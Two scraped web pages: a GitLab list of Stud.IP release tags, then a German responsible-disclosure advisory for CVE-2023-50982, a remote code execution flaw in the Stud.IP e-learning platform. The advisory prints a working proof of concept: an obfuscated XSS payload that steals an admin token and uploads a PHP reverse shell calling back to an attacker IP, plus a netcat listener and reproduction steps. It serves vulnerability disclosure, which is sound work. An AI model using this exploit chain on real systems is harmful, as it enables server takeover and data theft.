=== Content from gitlab.studip.de_86e33704_20250115_090040.html ===


[Skip to content](#content-body)
GitLab
[![](data:image/gif;base64...)](/ "Homepage")

* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)

# Tags

Tags give the ability to mark specific points in history as being important

* [v5.5.3](/studip/studip/-/tags/v5.5.3)
  protected
  [d77aeb14](/studip/studip/-/commit/d77aeb1454927d85bf7eb3491453ee70100fe707)
  ·
  [prepare release 5.5.3](/studip/studip/-/commit/d77aeb1454927d85bf7eb3491453ee70100fe707)

  ·
  Dec 20, 2024

  Release:
  [v5.5.3](/studip/studip/-/releases/v5.5.3)
  ```
  Stud.IP v5.5.3
  ```
* [v5.4.6](/studip/studip/-/tags/v5.4.6)
  protected
  [25b3ba5d](/studip/studip/-/commit/25b3ba5d82999092b9ad147866b7cf63c3617629)
  ·
  [prepare release 5.4.6](/studip/studip/-/commit/25b3ba5d82999092b9ad147866b7cf63c3617629)

  ·
  Dec 20, 2024

  Release:
  [v5.4.6](/studip/studip/-/releases/v5.4.6)
  ```
  Stud.IP v5.4.6
  ```
* [v5.3.9](/studip/studip/-/tags/v5.3.9)
  protected
  [7341894e](/studip/studip/-/commit/7341894ed6df3271095b307f02e33eb87b24e756)
  ·
  [prepare release 5.3.9](/studip/studip/-/commit/7341894ed6df3271095b307f02e33eb87b24e756)

  ·
  Dec 20, 2024

  Release:
  [v5.3.9](/studip/studip/-/releases/v5.3.9)
  ```
  Stud.IP v5.3.9
  ```
* [v5.5.2](/studip/studip/-/tags/v5.5.2)
  protected
  [13b07a17](/studip/studip/-/commit/13b07a17bd3f0894e2b8003d8e55041b2ef3c4e7)
  ·
  [prepare release 5.5.2](/studip/studip/-/commit/13b07a17bd3f0894e2b8003d8e55041b2ef3c4e7)

  ·
  Sep 03, 2024

  Release:
  [v5.5.2](/studip/studip/-/releases/v5.5.2)
  ```
  Stud.IP v5.5.2
  ```
* [v5.4.5](/studip/studip/-/tags/v5.4.5)
  protected
  [a447cd53](/studip/studip/-/commit/a447cd536615e4e9bbbdd96397e4518e9a9dafcf)
  ·
  [prepare release 5.4.5](/studip/studip/-/commit/a447cd536615e4e9bbbdd96397e4518e9a9dafcf)

  ·
  Sep 03, 2024

  Release:
  [v5.4.5](/studip/studip/-/releases/v5.4.5)
  ```
  Stud.IP v5.4.5
  ```
* [v5.3.8](/studip/studip/-/tags/v5.3.8)
  protected
  [c985c900](/studip/studip/-/commit/c985c900fb92a8ad90e8d19e6cd70783a557d963)
  ·
  [prepare release 5.3.8](/studip/studip/-/commit/c985c900fb92a8ad90e8d19e6cd70783a557d963)

  ·
  Sep 03, 2024

  Release:
  [v5.3.8](/studip/studip/-/releases/v5.3.8)
  ```
  Stud.IP v5.3.8
  ```
* [v5.5.1](/studip/studip/-/tags/v5.5.1)
  protected
  [03ab7265](/studip/studip/-/commit/03ab72651f2be7f5ab44347362c86c250ae2821d)
  ·
  [prepare release 5.5.1](/studip/studip/-/commit/03ab72651f2be7f5ab44347362c86c250ae2821d)

  ·
  Jul 25, 2024

  Release:
  [v5.5.1](/studip/studip/-/releases/v5.5.1)
  ```
  Stud.IP v5.5.1
  ```
* [v5.4.4](/studip/studip/-/tags/v5.4.4)
  protected
  [95c53634](/studip/studip/-/commit/95c536340ce7d0f1315b489815d52163df580edd)
  ·
  [prepare release 5.4.4](/studip/studip/-/commit/95c536340ce7d0f1315b489815d52163df580edd)

  ·
  Jul 25, 2024

  Release:
  [v5.4.4](/studip/studip/-/releases/v5.4.4)
  ```
  Stud.IP v5.4.4
  ```
* [v5.3.7](/studip/studip/-/tags/v5.3.7)
  protected
  [88dd40e0](/studip/studip/-/commit/88dd40e0a933f318fdc901fce6036117119bae63)
  ·
  [prepare release 5.3.7](/studip/studip/-/commit/88dd40e0a933f318fdc901fce6036117119bae63)

  ·
  Jul 24, 2024

  Release:
  [v5.3.7](/studip/studip/-/releases/v5.3.7)
  ```
  Stud.IP v5.3.7
  ```
* [v5.2.9](/studip/studip/-/tags/v5.2.9)
  protected
  [cff6fac6](/studip/studip/-/commit/cff6fac615931491f20906c043410ab2789496b4)
  ·
  [prepare release 5.2.9](/studip/studip/-/commit/cff6fac615931491f20906c043410ab2789496b4)

  ·
  Jul 24, 2024

  Release:
  [v5.2.9](/studip/studip/-/releases/v5.2.9)
  ```
  Stud.IP v5.2.9
  ```
* [v5.5](/studip/studip/-/tags/v5.5)
  protected
  [79ba6677](/studip/studip/-/commit/79ba6677c5027144353dd1b66c92db0f15df90b2)
  ·
  [prepare release 5.5, re](/studip/studip/-/commit/79ba6677c5027144353dd1b66c92db0f15df90b2) [#3614](/studip/studip/-/issues/3614 "Release 5.5")

  ·
  Jun 18, 2024

  Release:
  [v5.5](/studip/studip/-/releases/v5.5)
  ```
  Stud.IP v5.5
  ```
* [v5.4.3](/studip/studip/-/tags/v5.4.3)
  protected
  [c8086135](/studip/studip/-/commit/c8086135fb810f324c843d59ed65fcb95d167f14)
  ·
  [prepare release 5.4.3](/studip/studip/-/commit/c8086135fb810f324c843d59ed65fcb95d167f14)

  ·
  Jun 18, 2024

  Release:
  [v5.4.3](/studip/studip/-/releases/v5.4.3)
  ```
  Stud.IP v5.4.3
  ```
* [v5.3.6](/studip/studip/-/tags/v5.3.6)
  protected
  [115d1460](/studip/studip/-/commit/115d146070c85b960f06c54e869d0b2efa2605c1)
  ·
  [prepare release 5.3.6](/studip/studip/-/commit/115d146070c85b960f06c54e869d0b2efa2605c1)

  ·
  Jun 17, 2024

  Release:
  [v5.3.6](/studip/studip/-/releases/v5.3.6)
  ```
  Stud.IP v5.3.6
  ```
* [v5.2.8](/studip/studip/-/tags/v5.2.8)
  protected
  [6a78fc43](/studip/studip/-/commit/6a78fc43cccf0f41011e77e808178b7e97ec361e)
  ·
  [prepare release 5.2.8](/studip/studip/-/commit/6a78fc43cccf0f41011e77e808178b7e97ec361e)

  ·
  Jun 17, 2024

  Release:
  [v5.2.8](/studip/studip/-/releases/v5.2.8)
  ```
  Stud.IP v5.2.8
  ```
* [v5.1.9](/studip/studip/-/tags/v5.1.9)
  protected
  [0a0bc6c5](/studip/studip/-/commit/0a0bc6c5e0d6a78a77a24cce04a9b9d4603e4b39)
  ·
  [prepare release 5.1.9](/studip/studip/-/commit/0a0bc6c5e0d6a78a77a24cce04a9b9d4603e4b39)

  ·
  Jun 17, 2024

  Release:
  [v5.1.9](/studip/studip/-/releases/v5.1.9)
  ```
  Stud.IP v5.1.9
  ```
* [v5.4.2](/studip/studip/-/tags/v5.4.2)
  protected
  [b8a9a755](/studip/studip/-/commit/b8a9a7558ba71a047c06d2a6394b9cdae08c2d54)
  ·
  [prepare release 5.4.2](/studip/studip/-/commit/b8a9a7558ba71a047c06d2a6394b9cdae08c2d54)

  ·
  Mar 14, 2024

  Release:
  [v5.4.2](/studip/studip/-/releases/v5.4.2)
  ```
  Stud.IP v5.4.2
  ```
* [v5.3.5](/studip/studip/-/tags/v5.3.5)
  protected
  [b452e1f1](/studip/studip/-/commit/b452e1f1fb167a54b993624cc63248165177d5ab)
  ·
  [prepare release 5.3.5](/studip/studip/-/commit/b452e1f1fb167a54b993624cc63248165177d5ab)

  ·
  Mar 14, 2024

  Release:
  [v5.3.5](/studip/studip/-/releases/v5.3.5)
  ```
  Stud.IP v5.3.5
  ```
* [v5.2.7](/studip/studip/-/tags/v5.2.7)
  protected
  [8a33dacb](/studip/studip/-/commit/8a33dacbb762556b74f974958804a8cc127acc73)
  ·
  [prepare release 5.2.7](/studip/studip/-/commit/8a33dacbb762556b74f974958804a8cc127acc73)

  ·
  Mar 14, 2024

  Release:
  [v5.2.7](/studip/studip/-/releases/v5.2.7)
  ```
  Stud.IP v5.2.7
  ```
* [v5.1.8](/studip/studip/-/tags/v5.1.8)
  protected
  [a8a45aa4](/studip/studip/-/commit/a8a45aa4ad4bdc1fb3d1b6f5c373beea4071ceb5)
  ·
  [prepare release 5.1.8](/studip/studip/-/commit/a8a45aa4ad4bdc1fb3d1b6f5c373beea4071ceb5)

  ·
  Mar 14, 2024

  Release:
  [v5.1.8](/studip/studip/-/releases/v5.1.8)
  ```
  Stud.IP v5.1.8
  ```
* [v5.4.1](/studip/studip/-/tags/v5.4.1)
  protected
  [f99ba412](/studip/studip/-/commit/f99ba4122fd71c79c56adebfac4e4e4d14ed3ae3)
  ·
  [prepare release 5.4.1](/studip/studip/-/commit/f99ba4122fd71c79c56adebfac4e4e4d14ed3ae3)

  ·
  Dec 28, 2023

  Release:
  [v5.4.1](/studip/studip/-/releases/v5.4.1)
  ```
  Stud.IP v5.4.1
  ```

* Prev
* [1](/studip/studip/-/tags)
* [2](/studip/studip/-/tags?page=2)
* [3](/studip/studip/-/tags?page=3)
* [Next](/studip/studip/-/tags?page=2)



=== Content from rehmeinfosec.de_72bdf5bc_20250115_090041.html ===
[Homerehme.infosec[**Was, Wie, Warum?**Schnelleinstieg](/schnelleinstieg)](/)

* [Services](/leistungen)
  + [Penetrationstests & Red-Teaming](/leistungen/penetrationstests-red-teaming)
  + [Code Audits](/leistungen/code-audits)
* [Unternehmen](/unternehmen)
* [Labor](/labor)
  + [ILIAS 7 & 8 - OS Command Injection](/labor/ilias-7-8-os-command-injection)
  + [ILIAS 7 & 8 - Mehrere Remote Code Execution Sicherheitslücken in "Fragenpool für Tests" Import](/labor/ilias-7-8-mehrere-remote-code-execution-sicherheitsluecken-in-fragenpool-fuer-tests-import)
  + [ILIAS 7 - Remote Code Execution in "Fragenpool für Umfragen" Import](/labor/ilias-7-remote-code-execution-in-fragenpool-fuer-umfragen-import)
  + [RoundCube 1.6.4 and 1.5.5 - Cross Site Scripting (XSS)](/labor/roundcube-1-6-4-and-1-5-5-cross-site-scripting-xss)
  + [Multiple Cross Site Scipting (XSS) in ILIAS eLearning platform](/labor/multiple-cross-site-scipting-xss-in-ilias-elearning-platform)
  + [Local File Inclusion in ILIAS eLearning platform](/labor/local-file-inclusion-in-ilias-elearning-platform)
  + [Remote Code Execution und .htaccess Bypass in ILIAS eLearning platform](/labor/remote-code-execution-and-bypassing-htaccess-rule-in-ilias-elearning-platform)
  + [Arbitrary File Deletion in ILIAS eLearning platform](/labor/arbitrary-file-deletion-in-ilias-elearning-platform)
  + [Remote Code Execution in Stud.IP (eLearning platform)](/labor/cve-2023-50982)
  + [OS Command Injection in ILIAS eLearning platform](/labor/cve-2023-45869)
  + [Local File Inclusion to Arbitrary File Copy in ILIAS eLearning platform](/labor/cve-2023-45868)
  + [XSS in Roundcube Webmailer](/labor/cve-2023-47272)
  + [Local File Inclusion in ILIAS eLearning platform](/labor/cve-2023-45867)
[Kontakt](/impressum)
## Weitere Veröffentlichungen

In unserem Labor schreiben wir regelmäßig in Form von Blogbeiträgen über identifizierte Sicherheitslücken, welche nach dem [Responsible Disclosure](/responsible-disclosure) Verfahren veröffentlicht werden.

[Zum Labor](/labor)
#### Veröffentlichung (CVE-2023-50982)

# Remote Code Execution in Stud.IP (eLearning platform)

08.01.2024 - Rene Rehme

Es wurde eine [Remote Code Execution (RCE)](https://www.invicti.com/learn/remote-code-execution-rce/) Sicherheitslücke in **Stud.IP v5.3.2 (Release vom 04.10.2023)** entdeckt. Gefunden wurde eine Schwachstelle im Administrativen Bereich Smileys, welche es ermöglicht eine RCE durchzuführen, indem Schadcode über eine unzureichend geschützte Uploadfunktionalität innerhalb des documentRoot abgelegt und ausgeführt werden konnte.

#### Responsible Disclosure

⚑ 25. Sep. 2023 - Die Sicherheitslücke wurde identifiziert.
→ 26. Sep. 2023 - Die Sicherheitslücke wurde an stud.IP gemeldet.
← 29. Sep. 2023 - stud.IP bestätigt den Erhalt des Reports.
← 06. Okt. 2023 - stud.IP bestätigt, dass die Sicherheitslücke geschlossen wurde.
← 28. Dez. 2023 - Patched stud.IP-Release: [v5.3.4](https://sourceforge.net/projects/studip/files/Stud.IP/5.3/), [v5.2.6](https://sourceforge.net/projects/studip/files/Stud.IP/5.2/), [v5.1.7](https://sourceforge.net/projects/studip/files/Stud.IP/5.1/), [v5.0.9](https://sourceforge.net/projects/studip/files/Stud.IP/5.0/)

## Allgemeine Beschreibung

Die Ausnutzung der Sicherheitslücke muss durch [Cross Site Scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting) erfolgen, da hohe Privilegien (Rolle root) benötigt werden. Im Zuge der Ausforschung wurden mehrere XSS Sicherheitslücken entdeckt, welche hierfür in Frage kommen. Diese konnten sich mit einem normalen User-Account bewerkstelligen lassen.

Unter bestimmten vorherrschenden Bedingungen ist eine XSS Sicherheitslücke für die Ausnutzung der RCE auch ohne User-Account möglich.

In Kombination der gefundenen Schwachstellen, konnte ein kritischer Impact erzielt werden.

Ein potenzieller Angreifer könnte mit einer erfolgreicher Ausnutzung, Zugriff auf die Applikation und das zugrunde liegende Betriebsystem (mit den Rechten des Webserver-User www-data) erlangen.

## Proof of Concept (PoC)

## Reproduktion der Sicherheitslücke

#### Reproduktionsschritte

Um den PoC zu reproduzieren, werden zwei Schwachstellen in Kombination verwendet:

Mit einem Account zur Bereitstellung von Lernmaterialien, beispielsweise mit der Rolle „Dozent“, kann im OER Campus-Bereich die Option Meine Materialien (/dispatch.php/oer/mymaterial) ausgewählt werden, gefolgt von der Auswahl Neues Lernmaterial hochladen. Im darauf erscheinenden Formular kann ein individueller Titel festgelegt, und eine HTML-Datei über die Funktion Vorschau-Bilddatei (optional) hochgeladen werden.

Normalerweiße ist es vorgesehen hierüber nur Dateiformate hochzuladen, die einer Bilddatei entsprechen. Nach dem Absenden des Formulars, wird die Methode edit\_action() der Klasse Oer\_MymaterialController angesprochen, worüber keine Überprüfung auf einen gültigen Image MimeType der hochgeladenen Datei erfolgt. Hier können also beliebige Dateiformate hochgeladen werden. Wir verwenden die Funktion, um eine HTML-Datei hochzuladen, welche Schadcode in Form von JavaScript beinhaltet. Bei interpretation wird eine Payload ausgeführt, welche zu einer Eskalation genutzt wird.

In der HTML-Datei wird folgende Payload hinterlegt:

payload
```
<html><body><script>eval(atob('Y29uc3QgYmFzZVVyaT13aW5kb3cubG9jYXRpb24ucHJvdG9jb2wrIi8vIit3aW5kb3cubG9jYXRpb24uaG9zdDtmZXRjaChiYXNlVXJpKyIvZGlzcGF0Y2gucGhwL2FkbWluL3NtaWxleXMvdXBsb2FkL2EiKS50aGVuKGU9PmUudGV4dCgpKS50aGVuKGU9Pntjb25zdCB0PShuZXcgRE9NUGFyc2VyKS5wYXJzZUZyb21TdHJpbmcoZSwidGV4dC9odG1sIik7cmV0dXJuIHNlY3VyaXR5VG9rZW5JbnB1dD10LnF1ZXJ5U2VsZWN0b3IoJ2lucHV0W25hbWU9InNlY3VyaXR5X3Rva2VuIl0nKS5nZXRBdHRyaWJ1dGUoInZhbHVlIil9KS50aGVuKGU9PmZldGNoKGJhc2VVcmkrIi9kaXNwYXRjaC5waHAvYWRtaW4vc21pbGV5cy91cGxvYWQvYSIse2NyZWRlbnRpYWxzOiJpbmNsdWRlIixoZWFkZXJzOnsiQ29udGVudC1UeXBlIjoibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tQUJDREUifSxyZWZlcnJlcjpiYXNlVXJpKyIvZGlzcGF0Y2gucGhwL2FkbWluL3NtaWxleXMiLGJvZHk6Jy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tQUJDREVcbkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic2VjdXJpdHlfdG9rZW4iXG5cbicrZSsnXG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLUFCQ0RFXG5Db250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InNtaWxleV9maWxlIjsgZmlsZW5hbWU9InNoZWxsLnBocCJcbkNvbnRlbnQtVHlwZTogaW1hZ2UvanBlZ1xuXG48P3BocCBleGVjKCIvYmluL2Jhc2ggLWMgXCdiYXNoIC1pID4mIC9kZXYvdGNwLyIuJF9HRVRbXCdpcFwnXS4iLzEyMzQgMD4mMVwnIik7Pz5cblxuLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1BQkNERVxuQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJ1cGxvYWQiXG5cblxuLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1BQkNERS0tXG4nLG1ldGhvZDoiUE9TVCIsbW9kZToiY29ycyJ9KSkudGhlbigoKT0+ZmV0Y2goYmFzZVVyaSsiL3BpY3R1cmVzL3NtaWxlL3NoZWxsLnBocD9pcD0xMjcuMC4wLjEiLHttZXRob2Q6IkdFVCJ9KSk7'));</script></body></html>
```

Dieser Base64 encodierte JavaScript-Code führt im Wesentlichen eine Dateiübertragung (Upload) und anschließend einen Remote-Code-Ausführung ([Remote Code Execution, RCE](https://www.invicti.com/learn/remote-code-execution-rce/)) aus.

**Konstantenfestlegung**: Es wird eine Konstante baseUri definiert, die den Basis-URI der aktuellen Webseitenadresse enthält. Der Basis-URI besteht aus dem Protokoll und dem Hostnamen.

**Abrufen eines Sicherheitstokens**: Die fetch-Funktion wird verwendet, um eine Anfrage an den Server zu senden, um die Inhalte der URL baseUri + "/dispatch.php/admin/smileys/upload/a" abzurufen. Sobald die Antwort empfangen wird, wird der HTML-Inhalt dieser Antwort als Text extrahiert. Dann wird ein Sicherheitstoken aus dem HTML-Inhalt extrahiert. Dieses Token wird später für die Authentifizierung bei einer anderen Anfrage verwendet.

**Dateiübertragung**: Ein weiterer fetch-Aufruf wird gemacht, um eine Datei an den Server zu übertragen. Die Anfrage enthält das Sicherheitstoken sowie den Dateiinhalt, der als Teil des Body übergeben wird. Der Dateiinhalt enthällt PHP-Code.

**Remote-Code-Ausführung (RCE)**: Durch das Hochladen und Ausführen der PHP-Datei wird versucht, eine Shell-Verbindung zu unserem Rechner (Host) und einer bestimmten Portnummer herzustellen (127.0.0.1:1234 in diesem Fall).

**Abschluss**: Eine GET-Anfrage an die hochgeladene PHP-Datei gesendet, um den Code auszuführen und eine Verbindung zu der angegebenen IP-Adresse und Portnummer herzustellen.

Nachdem der Eintrag erstellt wurde, kann aus der Adressleiste die generierte ID kopiert werden. bsp: /dispatch.php/oer/market/details/**32ac0e22f59edfe775441d237c8c97cc**

Als nächstes muss ein weiteres Lernmaterial erstellt werden. Diesesmal mit dem Titel FINAL und der folgenden URL im Formularfeld Vorschau-URL (optional):
/dispatch.php/oer/endpoints/download\_front\_image/**32ac0e22f59edfe775441d237c8c97cc**/inline

Die ID innerhalb der URL entspricht der zuvor kopierten ID. Das Protokoll und die Domain müssen ebenfalls entsprechend der eigenen Instanz angegeben werden.

Über den Button Hochladen wird der Vorgang abgeschlossen.

Logge dich aus und mit einem Account mit der Rolle root wieder ein.

Navigiere auf das Lernmaterial FINAL. Die Payload wird mit dem Seitenaufruf ausgeführt und verbindet den Webserver mit dem System des Angreifers.

## Beschreibung der Payload

Über einen Endpunkt wird eine GET-Anfrage an die spezifische URL für das Smileys-Upload-Formular gesendet. Folgend wird Response der Anfrage analysiert, um den Sicherheitstoken (securityToken) zu extrahieren. Anschließend wird über einen nächsten Endpunkt eine POST-Anfrage an die selbe URL gesendet, um eine bösartige Datei (shell.php) hochzuladen. Die Anfrage enthält den zuvor extrahierten Sicherheitstoken und eine PHP-Payload.

**Background**: Im Bereich Admin -> Settings -> Smileys können von einem priviligierten Nutzer Bilddateien hochgeladen werden. Beim Versuch eine Datei hochzuladen, welche keiner Bilddatei entspricht, wird bei normaler Applikationsnutzung eine Fehlermeldung ausgegeben. Hierbei wird Backendseitig nur der Mime Type anhand der Angabe Content-Type des POST Bodies auf image gegengeprüft:

Admin\_SmileysController
```
// Admin_SmileysController -> upload_action()
$no_image = !empty($upload['type']) && mb_substr($upload['type'], 0, 5) != 'image';
```

Wird der POST-Request so modifiziert, dass der Mime Type weiterhin valide erscheint (z.B. Content-Type: image/jpeg), den filename aber mit einer .php Dateiendung versieht (z.B. filename="shell.php"), erfolgt der Upload dennoch mit einer 200 Header-Response erfolgreich. Die Datei wird unter /public/pictures/smile abgelegt und kann via /pictures/smile/shell.php ausgeführt werden.

Die Payload in der PHP-Datei (<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/".$\_GET['ip']."/1234 0>&1'");?>) versucht also eine Bash-Shell auf dem Server zu öffnen und eine Reverse Shell-Verbindung zu der angegebenen IP-Adresse über $\_GET['ip'] und Port 1234 herzustellen. Die IP-Adresse wird beim Aufruf der Datei über den URL Anfrage-Parameter id ermittelt.

Nachdem die bösartige Datei hochgeladen wurde, wird eine Anfrage an eine URL gesendet, die die Shell.php Datei ausführt und dabei versucht, eine Reverse Shell-Verbindung zu der angegebenen IP-Adresse des Angreifers (in unserem Fall localhost) herzustellen. Sollte die Payload durch einen root User ausgeführt werden und der Angreifer über den netcat Befehl mit dem Port 1234 auf den Verbindungsaufbau wartet, erfolgt die Verbindung zum Webserver.

CLI
```
nc -nlvp 1234
```
![test](https://rehmeinfosec.de/_Resources/Persistent/4/c/1/0/4c10e345bdb8133d866c23c0c02cc648119ee9b6/1ac511de1b2e4cdf9189f87a70b911a9-1438x293.webp)

Natürlich ist auch die Hinterlegung jeder anderen Art von Schadcode denkbar und möglich. z.B. eine Webshell.

## Klassifikation

CWE-434: Unrestricted Upload of File with Dangerous Type
CWE-79: Improper Neutralization of Input During Web Page

## Bewertung

9.3Critical[CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/)
#### Exploitability Metrics

**Attack Vector (AV): N**
Es handelt sich um einen Netzwerkangriff. Die verwundbare Komponente ist "aus der Ferne ausnutzbar" und wird als ein Angriff betrachtet, der auf Protokollebene über das Internet stattfindet.

**Attack Complexity (AC): L**
Besondere Zugangsbedingungen oder mildernde Umstände bestehen nicht.

**Attack Requirements (AT): N**
Es wird davon ausgehen, dass die Payload in den meisten Fällen erfolgreich ausgeführt wird. Es werden keine besonderen Einstellungen oder Konfigurationen vorrausgesetzt.

**Privileges Required (PR): L**
Der Angreifer benötigt Privilegien, die grundlegende Benutzerfunktionen eines Users bereitstellen. Für eine Ausnutzung reicht i.d.R ein User-Account.

**User Interaction (UI): A**
Es ist eine User-Interaktion durch ein Opfer notwendig. Ein priviligierter Nutzer muss eine bestimmte Seite (das Lehrmaterial des Angreifers) aufrufen.

#### Vulnerable System Impact Metrics

**Confidentiality (VC): H**
Bei einem erfolgreichen Angriff kommt es zu einem totalen Verlust der Vertraulichkeit. Ressourcen innerhalb der betroffenen Komponente werden dem Angreifer bei gegebenem Lesezugriff und entsprechender Berechtigung durch den Webserver-User www-data offengelegt.

**Integrity (VI): H**
Bei einem erfolgreichen Angriff kommt es zu einem totalen Verlust der Integrität. Der Angreifer ist in der Lage Dateien der betroffenen Komponente (der Anwendung) zu verändern.

**Availability (VA): H**
Bei einem erfolgreichen Angriff ist der Angreifer ist in der Lage, den Zugang zu den Ressourcen der betroffenen Komponente vollständig zu verweigern, indem z.B. Dateien oder Daten gelöscht werden.

#### Subsequent System Impact Metrics

**Confidentiality (SC): H**
Bei einem erfolgreichen Angriff kommt es zu einem totalen Verlust der Vertraulichkeit. Ressourcen und Komponenten des Betriebssystems werden dem Angreifer bei gegebenem Lesezugriff und entsprechender Berechtigung durch den Webserver-User www-data offengelegt. Der Zugriff auf MySQL oder andere Komponenten wird ermöglicht.

**Integrity (SI): H**
Bei einem erfolgreichen Angriff kommt es zu einem totalen Verlust der Integrität. Der Angreifer ist in der Lage Dateien des Betriebssystems zu verändern.

**Availability (SA): H**
Bei einem erfolgreichen Angriff ist der Angreifer ist in der Lage, den Zugang zu den Ressourcen aus Komponenten des Betriebssystems vollständig zu verweigern, indem z.B. Dateien oder Daten gelöscht werden.

## Externe Informationen

**CVE (MITRE)**

<https://www.cve.org/CVERecord?id=CVE-2023-50982>

**NIST (National Vulnerability Database)**

<https://nvd.nist.gov/vuln/detail/CVE-2023-45869>

rehme.infosec

Piiip, in [meinem persönlichen Blog](https://renerehme.de) veröffentliche ich Artikel über IT-Security, persönliche Projekte, Coding Experimente oder Basteleien. Im Labor findest du aktuelle Veröffentlichungen von gefunden Sicherheitslücken in Software.

* [LinkedIn](https://www.linkedin.com/company/100283045/)
* [XING](https://www.xing.com/pages/rehme-infosec)

Services

* [Penetration Testing](/leistungen/penetrationstests-red-teaming "Penetration Testing")
* [Red-Teaming](/leistungen/penetrationstests-red-teaming "Red-Teaming")
* [Code Audits](/leistungen/code-audits "Code Audits")

Unternehmen

* [Über uns](/unternehmen "Über uns")

Nützliche Links

* [Responsible Disclosure](/labor/responsible-disclosure)
* [IT-Sicherheitshinweise des CERT-Bund](/alle-it-sicherheitshinweise-des-cert-bund)

Legal

* [Impressum](/impressum)
* [Datenschutz](/datenschutz)

© rehme.infosec 2024, alle Rechte vorbehalten


